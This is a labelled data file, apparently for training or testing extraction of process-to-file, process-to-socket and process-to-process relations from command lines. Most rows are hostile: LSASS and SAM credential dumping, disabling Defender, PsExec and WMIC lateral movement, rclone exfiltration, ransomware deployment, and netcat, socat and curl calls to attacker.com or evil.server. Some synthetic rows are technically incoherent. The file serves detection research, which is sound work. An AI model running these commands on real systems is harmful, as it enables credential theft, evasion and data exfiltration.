process-file-write(e1,e2)	<e1>adfind.exe</e1> -sc computers_pwdnotreqd > <e2>computers_pwdnotreqd.txt</e2>
process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>/tmp/malware.sh</e2>
process-file-exec(e1,e2)	"<e1>psexec.exe</e1> \\<IP ADDRESS> -u <DOMAIN>\Administrator -p ""<PASSWORD>"" -s -d -h -r mstdc -accepteula -nobanner <e2>c:\windows\temp\ttsel.exe</e2>"
process-file-exec(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> /node:""DOMAINCONTROLLER"" process call create <e2>C:\3.exe</e2>"
process-file-exec(e1,e2)	<e1>C:\Windows\system32\mmc.exe</e1> <e2>C:\Windows\system32\dsa.msc</e2>
process-process-inject(e1,e2)	<e1>wmic.exe</e1> dllinjector.exe -p <e2>lsass.exe</e2> -d payload.dll
process-file-read(e1,e2)	"<e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>%PUBLIC%\Music</e2>"
process-socket-receive(e1,e2)	<e1>rclone.exe</e1> <e2>\\SERVER.domain.name\path</e2> mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
process-file-write(e1,e2)	cmd_12.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_12.bat</e2>
process-file-chmod(e1,e2)	<e1>attrib</e1> +h <e2>xmrig-notls.exe</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>attrib</e2> +s +h C:\Windows\Temp\evil.dll
process-file-write(e1,e2)	"""powershell.exe"" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id <e1>C:\windows\temp\ssasl.pmd</e1> full | out-host; Compress-Archive C:\windows\temp\ssasl.pmd <e2>C:\windows\temp\ssasl.zip</e2>"
process-process-fork(e1,e2)	"start <e1>PsExec.exe</e1> -accepteula @C:\share$\comps1.txt -u ""domain\User"" -p ""$PASSWORD"" <e2>cmd</e2> /c COPY ""\\DOMAINCONTROLLER\share$\fQumH.exe"" ""C:\windows\temp"""
process-file-chmod(e1,e2)	powershell.exe <e1>chmod</e1> 777 <e2>/usr/local/bin/backdoor</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 10.10.10.10:4444
process-process-fork(e1,e2)	rundll32.exe <e1>powershell</e1> Start-Process <e2>powershell.exe</e2>
process-socket-send(e1,e2)	"<e1>wmic</e1> <e2>/node:<REDACTED></e2> /user:""<REDACTED>"" /password:""<REDACTED>"" logicaldisk get caption,description,drivetype,providername,volumename"
process-socket-send(e1,e2)	"rundll32.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>10.10.10.10:4444</e2> -Body 'cmd=whoami'"""
process-process-unlink(e1,e2)	<e1>python.exe</e1> Stop-Process -Name <e2>taskmgr.exe</e2> -Force
process-file-read(e1,e2)	<e1>reg_65.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>curl</e2> -X POST --data 'ping' https://evil.server/payload
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>chmod</e2> 777 C:\ProgramData\updater.exe
process-process-fork(e1,e2)	"<e1>PsExec.exe</e1> /accepteula @comps1.txt -u ""domain.local\Administrator"" -p ""REDACTED"" <e2>cmd</e2> /c COPY ""\\REDACTED\share$\ds.exe"" %WINDIR%\temp"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>cmd.exe</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>nc</e2> -lvp 4444 -s http://attacker.com/c2
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /t REG_DWORD /v ""TSUserEnabled"" /d 0 /f"
process-file-unlink(e1,e2)	python.exe <e1>Remove-Item</e1> <e2>C:\Users\Public\runme.bat</e2> -Force
process-file-read(e1,e2)	"<e1>reg</e1> query <e2>hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</e2> /v ""DisplayName"" /s"
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender""</e2> /v DisableAntiSpyware /t REG\_DWORD /d 1 /f"
process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft && mkdir <e2>Network</e2>
Other	C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 <e1>c:\programdata\lsass.zip</e1> <e2>c:\programdata\lsass.dmp</e2>
process-socket-send(e1,e2)	<e1>portfwd</e1> add -R -p 89474 -l 4453 -L <e2>192.169.6.122</e2>
process-file-read(e1,e2)	"<e1>python_17.exe</e1> -c <e2>""open('C:\\temp\\pw_17.txt').read()""</e2>"
process-file-exec(e1,e2)	<e1>cmd.exe</e1> /c %USERPROFILE%\AppData\bigfile.exe -i -c <e2>%USERPROFILE%\AppData\1.bat</e2>
process-socket-send(e1,e2)	<e1>cmd.exe</e1> Invoke-WebRequest -Uri <e2>192.168.1.100:8080</e2> -Method POST
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>del</e2> /tmp/malware.sh
process-process-fork(e1,e2)	<e1>wmic.exe</e1> runas /user:admin <e2>powershell.exe</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>attrib</e2> +s +h C:\ProgramData\updater.exe
process-file-chmod(e1,e2)	python.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
process-socket-receive(e1,e2)	cmd.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>http://attacker.com/c2</e2>
process-file-unlink(e1,e2)	rundll32.exe <e1>rm</e1> <e2>/tmp/malware.sh</e2>
process-file-write(e1,e2)	<e1>certutil_76.exe</e1> -encode input_76.txt <e2>C:\temp\encoded_76.txt</e2>
process-process-inject(e1,e2)	powershell.exe <e1>dllinjector.exe</e1> -p <e2>notepad.exe</e2> -d payload.dll
process-file-read(e1,e2)	"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e1>""reg.exe</e1> save <e2>hklm\sam</e2> c:\ProgramData\sam.save"" /f"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>rm</e2> C:\ProgramData\updater.exe
process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m http.server 8080 --bind <e2>10.10.10.10:4444</e2>
process-file-read(e1,e2)	<e1>notepad_49.exe</e1> <e2>C:\Users\admin\notes_49.txt</e2>
process-socket-send(e1,e2)	powershell.exe <e1>curl</e1> -X POST --data 'ping' <e2>192.168.1.100:8080</e2>
process-process-fork(e1,e2)	<e1>cmd_51.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_51.bat
process-process-unlink(e1,e2)	powershell.exe <e1>taskkill</e1> /IM <e2>svchost.exe</e2> /F
process-file-unlink(e1,e2)	cmd.exe <e1>Remove-Item</e1> <e2>C:\Users\Public\runme.bat</e2> -Force
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"""
process-file-chmod(e1,e2)	wmic.exe <e1>icacls</e1> <e2>C:\Windows\Temp\evil.dll</e2> /grant Everyone:F
process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m http.server 8080 --bind <e2>10.10.10.10:4444</e2>
process-file-write(e1,e2)	<e1>nuclei</e1> -l sept24.txt -o <e2>sept24_op.txt</e2> -s medium
process-process-inject(e1,e2)	<e1>wmic.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>notepad.exe</e2>
process-file-write(e1,e2)	cmd_51.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_51.bat</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>nc</e1> -lvp 4444 -s <e2>192.168.1.100:8080</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>powershell.exe</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>curl</e2> -X POST --data 'ping' 10.10.10.10:4444
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>reg.exe</e2> save hklm\sam c:\ProgramData\sam.hive
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableOnAccessProtection"" /t REG\_DWORD /d ""1"" /f"
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>chmod</e2> 777 C:\Windows\Temp\evil.dll
process-file-chmod(e1,e2)	python.exe <e1>icacls</e1> <e2>/var/tmp/hide.so</e2> /grant Everyone:F
process-socket-send(e1,e2)	cmd.exe /c <e1>echo</e1> nbproc > <e2>\\.\pipe\nbproc</e2>
process-file-exec(e1,e2)	<e1>svchost.exe</e1> -exec <e2>/usr/local/bin/backdoor</e2>
process-file-write(e1,e2)	<e1>notepad_70.exe</e1> <e2>C:\Users\test\notes_70.txt</e2>
process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind https://evil.server/payload
process-file-read(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save <e2>hklm\system</e2> c:\users\REDACTED\appdata\local\temp\1\mkffdg
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Sophos System Protection""</e2> call uninstall /nointeractive"
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee SiteAdvisor Enterprise"" call uninstall /nointeractive"
process-file-read(e1,e2)	<e1>ftp_87.exe</e1> <e2>-s:script_87.txt</e2> C:\inetpub\wwwroot\ftp_87.log
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>chmod</e2> 777 C:\Windows\Temp\evil.dll
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>attrib</e2> +s +h C:\Windows\Temp\evil.dll
process-file-write(e1,e2)	cmd_45.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_45.txt</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>taskkill</e2> /IM notepad.exe /F
process-file-exec(e1,e2)	<e1>rundll32_50.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>attrib</e2> +s +h /tmp/malware.sh
process-file-exec(e1,e2)	<e1>wmic.exe</e1> /c start <e2>C:\Windows\Temp\evil.dll</e2>
process-file-unlink(e1,e2)	rundll32.exe <e1>del</e1> <e2>/tmp/malware.sh</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>curl</e2> -X POST --data 'ping' 10.10.10.10:4444
process-file-exec(e1,e2)	"<e1>wmic.exe</e1> -Command ""Start-Process <e2>C:\ProgramData\updater.exe""</e2>"
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>taskkill</e2> /IM taskmgr.exe /F
process-process-unlink(e1,e2)	cmd.exe <e1>taskkill</e1> /IM <e2>winlogon.exe</e2> /F
process-file-unlink(e1,e2)	wmic.exe <e1>Remove-Item</e1> <e2>C:\ProgramData\updater.exe</e2> -Force
process-process-inject(e1,e2)	<e1>python.exe</e1> Set-ProcessInjection -Target <e2>notepad.exe</e2>
process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat</e2> /sc MINUTE /mo 720 /F"
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine""</e2> /v ""MpEnablePus"" /t REG\_DWORD /d ""0"" /f"
process-process-fork(e1,e2)	%WINDIR%\system32\cmd.exe /c <e1>net</e1> localgroup administrators <e2>sqlbackup</e2> /add
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>notepad.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>dir</e2> *.dll
process-file-read(e1,e2)	torify <e1>nuclei</e1> -l <e2>large_scope</e2> -o large_scope -as
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>net</e2> view \\DOMAINCONTROLLER /all
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>nc</e2> -lvp 4444 -s https://evil.server/payload
process-file-read(e1,e2)	<e1>certutil_22.exe</e1> -urlcache -split -f http://malicious.site/data_22.enc <e2>C:\Temp\temp_22.enc</e2>
process-file-write(e1,e2)	<e1>notepad_58.exe</e1> <e2>C:\Users\test\notes_58.txt</e2>
process-socket-send(e1,e2)	<e1>cmd.exe</e1> Invoke-WebRequest -Uri <e2>http://attacker.com/c2</e2> -Method POST
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>taskkill</e2> /IM winlogon.exe /F
process-socket-receive(e1,e2)	<e1>certutil_95.exe</e1> -urlcache -split -f <e2>http://malicious.site/data_95.enc</e2> C:\Temp\temp_95.enc
process-file-read(e1,e2)	<e1>adfind.exe</e1> -gcb -sc <e2>trustdmp</e2>
process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -f ""(objectcategory=group)"" > <e2>ad_group.txt</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>fsutil</e2> behavior set SymlinkEvaluation R2L:1
process-file-write(e1,e2)	"<e1>powershell_4.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_4.txt</e2> -Value 'infected'"""
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"""
process-file-write(e1,e2)	"cmd.exe /C netsh advfirewall firewall add rule dir=in name=""DCOM"" <e1>program=C:\Windows\system32\svchost.exe</e1> service=rpcss action=allow protocol=TCP localport=135 > <e2>C:\Windows\Temp\VlPWyecW.tmp</e2> 2>&1"
process-file-read(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p lsass.exe -d <e2>payload.dll</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>chmod</e2> 777 /usr/local/bin/backdoor
process-socket-send(e1,e2)	<e1>mstsc.exe</e1> <e2>/v:IP_ADDRESS_1</e2>
process-socket-receive(e1,e2)	cmd.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>https://evil.server/payload</e2>
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> Set-ProcessInjection -Target <e2>taskmgr.exe</e2>
Other	"C:\Windows\system32\cmd.exe /C cool.exe <e1>[DC IP ADDRESS]</e1> [DOMAIN NAME] Administrator -c ""taskkill /f /im <e2>explorer.exe""</e2>"
process-process-fork(e1,e2)	"<e1>cmd</e1> /v /c <e2>net</e2> group /domain ""Domain Admins"" > ""%TEMP%\51362.txt"" 2>&1"
process-process-fork(e1,e2)	"<e1>psexec.exe</e1> \\[TARGET IP] -u [DOMAIN]\[USER] -p ""[PASSWORD]"" -s -d -h -r mstdc -accepteula -nobanner <e2>c:\windows\temp\p.bat</e2>"
process-process-fork(e1,e2)	<e1>cmd_57.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_57.bat
process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>Administrators</e2> WDAGUtilityAccount2 /add
process-file-write(e1,e2)	"<e1>C:\Windows\system32\reg.exe</e1> ADD ""HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"" /f /t REG_DWORD /v <e2>""C:\ProgramData\Microsoft\Oweboiqnb""</e2> /d ""0"""
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>del</e2> C:\ProgramData\updater.exe
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>curl</e2> -X POST --data 'ping' 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>icacls</e2> C:\Windows\Temp\evil.dll /grant Everyone:F
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C WMIC/node:""DC.DOMAIN.local"" process call create ""cmd /c <e2>C:\PerfLogs\servisess.exe""</e2>"
process-file-unlink(e1,e2)	svchost.exe <e1>rm</e1> <e2>C:\Users\Public\runme.bat</e2>
process-process-fork(e1,e2)	python.exe <e1>powershell</e1> Start-Process <e2>svchost.exe</e2>
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>MSExchangeEdgeSync</e2>
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /v fDenyTSConnections /t REG_DWORD /d 0"
process-file-read(e1,e2)	"PsExec.exe /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>""%PUBLIC%\Music""</e2>"
process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat</e2> /SC ONSTART /F"
process-file-read(e1,e2)	"<e1>esentutl.exe</e1> /r V01 <e2>/l""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache""</e2> /s""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"" /d""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"""
process-file-read(e1,e2)	"<e1>cmd</e1> /c COPY /Y <e2>""\\REDACTED\share$\ds.exe""</e2> ""%PUBLIC%\Music"""
process-file-exec(e1,e2)	"cmd.exe /Q /c <e1>schtasks.exe</e1> /create /sc onlogon /tn ""Wow64 Subsystem"" /rl highest /tr <e2>""%%programdata%%\schcache\mswow86.exe</e2>"
process-process-inject(e1,e2)	<e1>wmic.exe</e1> dllinjector.exe -p <e2>notepad.exe</e2> -d payload.dll
process-file-read(e1,e2)	<e1>ftp_41.exe</e1> <e2>-s:script_41.txt</e2> C:\inetpub\wwwroot\ftp_41.log
process-file-read(e1,e2)	%WINDIR%\system32\cmd.exe /C <e1>net</e1> usre <e2>REDACTED</e2> /dom
process-socket-receive(e1,e2)	python.exe <e1>nc</e1> -lvp 4444 -s <e2>http://attacker.com/c2</e2>
process-file-unlink(e1,e2)	"<e1>reg</e1> delete <e2>""HKLM\Software\Policies\Microsoft\Windows Defender""</e2> /f"
process-process-unlink(e1,e2)	cmd.exe <e1>taskkill</e1> /IM <e2>taskmgr.exe</e2> /F
process-file-read(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p taskmgr.exe -d <e2>payload.dll</e2>
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee VirusScan Enterprise"" call uninstall /nointeractive"
process-socket-receive(e1,e2)	cmd.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind http://attacker.com/c2
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>DEL</e2> %USERPROFILE%\AppData\bigfile.txt
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>rm</e2> /var/tmp/hide.so
process-file-read(e1,e2)	<e1>adfind.exe</e1> -f objectcategory=computer -csv name operatingSystem > <e2>ad_computers_enum.txt</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> runas /user:admin <e2>rundll32.exe</e2>
process-process-fork(e1,e2)	<e1>torify</e1> <e2>sqlmap</e2> -u https://<domain>.gov.bd/admin/manage_user.php?id=1 -v 2 --delay 1.7 --time-sec 13 --tamper space2comment --risk 3 --level 5 --random-agent --no-cast --parse-errors --dbs
Other	"<e1>schtasks.exe</e1> /Create /RU ""NT AUTHORITY\SYSTEM"" /tn juqpxmakfk /tr ""regsvr32.exe -s <e2>C:\Users\REDACTED\ocrafh.html</e2>"" /SC ONCE /Z /ST 14:20 /ET 14:32"
process-file-read(e1,e2)	<e1>restic.exe</e1> -r rest:http://195.123.226.84:8000/ init --password-file <e2>ppp.txt</e2>
process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind http://attacker.com/c2
process-file-unlink(e1,e2)	svchost.exe <e1>del</e1> <e2>C:\Windows\Temp\evil.dll</e2>
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>echo</e1> 0291f1e69dd > <e2>\\.\pipe\82afc1</e2>
process-file-read(e1,e2)	<e1>WMIC</e1> /Node:localhost <e2>/Namespace:\\root\SecurityCenter2</e2> Path AntiVirusProduct Get displayName /Format:List
process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>C:\Perflogs\434.bat</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -gcb -sc trustdmp > trustdmp.txt
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>QQPCTray.exe</e2>
process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c whoami 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-process-fork(e1,e2)	<e1>python.exe</e1> runas /user:admin <e2>python.exe</e2>
process-file-chmod(e1,e2)	<e1>attrib</e1> +h <e2>config.json</e2>
Other	<e1>ping</e1> -n 1 <REDACTED>shell wmic <e2>/node:<REDACTED></e2> process get executablepath
process-process-fork(e1,e2)	"<e1>c:\windows\system32\cmd.exe</e1> /c <e2>wmic</e2> /node:""<REDACTED>"" process call create ""c:\perflogs\setup1.exe"""
process-file-exec(e1,e2)	<e1>c:\windows\system32\windowspowershell\v1.0\powershell.exe</e1> -exec bypass <e2>.\adrecon.ps1</e2>
process-process-fork(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>cmd</e1> /c <e2>vssadmin</e2> create shadow /for=C: 2>&1
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>nltest</e2> /domain_trusts /all_trusts
process-file-chmod(e1,e2)	cmd.exe <e1>chmod</e1> 777 <e2>C:\Windows\Temp\evil.dll</e2>
process-socket-receive(e1,e2)	python.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>https://evil.server/payload</e2>
process-file-write(e1,e2)	<e1>cmd.exe</e1> /c bitsadmin /transfer update_service \\REDACTED\share$\ds.exe <e2>%APPDATA%\ds.exe</e2> & %APPDATA%\ds.exe -pass REDACTED
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>route</e2> print
process-process-fork(e1,e2)	<e1>psexec.exe</e1> -accepteula -d -s \\<INTERNAL_IP> <e2>rundll32.exe</e2> C:\windows\192145.dll,StartW
process-socket-send(e1,e2)	<e1>powershell.exe</e1> Invoke-WebRequest -Uri <e2>http://attacker.com/c2</e2> -Method POST
process-file-read(e1,e2)	"PsExec.exe /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY /Y <e2>""\\REDACTED\share$\ds.exe""</e2> ""%PUBLIC%\Music"""
process-file-read(e1,e2)	<e1>cmd.exe</e1> /c copy <e2>\\REDACTED\c\windows\temp\p.bat</e2> c:\windows\temp\
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>rm</e2> C:\Windows\Temp\evil.dll
process-file-read(e1,e2)	<e1>powershell_74.exe</e1> Get-Content <e2>C:\Users\Public\secrets_74.txt</e2>
process-file-write(e1,e2)	<e1>powershell.exe</e1> Set-ItemProperty -Force -Path <e2>'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'</e2> -Name 'UseLogonCredential' -Value '1'
process-file-chmod(e1,e2)	wmic.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableIOAVProtection"" /t REG\_DWORD /d ""1"" /f"
process-file-read(e1,e2)	"<e1>powershell_64.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_64.yaml""</e2>"
process-file-exec(e1,e2)	"<e1>powershell.exe</e1> -Command ""Start-Process <e2>C:\Windows\Temp\evil.dll""</e2>"
process-file-exec(e1,e2)	<e1>invokemodule</e1> -module locker -locker <REDACTED>.dll -lockerpath <e2>programdata\microsoft</e2> -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint run -handlesystems custom
process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m http.server 8080 --bind <e2>192.168.1.100:8080</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>powershell</e2> Start-Process svchost.exe
process-file-exec(e1,e2)	<e1>cmd.exe</e1> -c <e2>\\<domain controller>\netlogon\<num>.exe</e2> --access-token <token>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>nc</e2> -lvp 4444 -s 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>attrib</e2> +S +H %appdata%\Microsoft\Network\Packages.txt
process-file-read(e1,e2)	<e1>wmic_92.exe</e1> process get commandline < <e2>C:\cmd\proc_92.txt</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -f ""(objectcategory=organizationalUnit)"" > ad_ous.txt"
process-file-read(e1,e2)	"<e1>rclone.exe</e1> copy <e2>""\\SERVER.domain.name\path""</e2> mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6"
process-file-read(e1,e2)	<e1>cmd.exe</e1> /c bitsadmin /transfer update_service <e2>\\REDACTED\share$\ds.exe</e2> %APPDATA%\ds.exe & %APPDATA%\ds.exe -pass REDACTED
Other	<e1>cmd.exe</e1> /C wmic <e2>/node:<remote host></e2> process get executablepath
process-file-read(e1,e2)	cmd.exe /Q /c <e1>expand</e1> <e2>cache.cab</e2> -F:* c:\programdata
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>C:\Windows\Temp\adf\anchorAsjuster_x64.exe</e1> --source=anchorDNS_x64.exe <e2>--target=anchor_x64.exe</e2> --domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid
process-process-inject(e1,e2)	<e1>cmd.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>svchost.exe</e2>
process-file-write(e1,e2)	<e1>procdump64.exe</e1> -ma lsass.exe <e2>lsass.dmp</e2>
process-file-write(e1,e2)	cmd.exe /C <e1>net</e1> view /all >> <e2>C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1</e2>
process-process-fork(e1,e2)	"<e1>REG</e1> ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""microsoft update"" /t REG_SZ /F /D <e2>""SCHTASKS</e2> /run /tn 9T6ukfi6"""
process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -subnets -f (objectCategory=subnet) > <e2>subnets.txt</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m http.server 8080 --bind <e2>192.168.1.100:8080</e2>
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C where /r <e2>C:\Windows\WinSxS\</e2> *Microsoft.ActiveDirectory.Management.dll*
process-socket-receive(e1,e2)	svchost.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>https://evil.server/payload</e2>
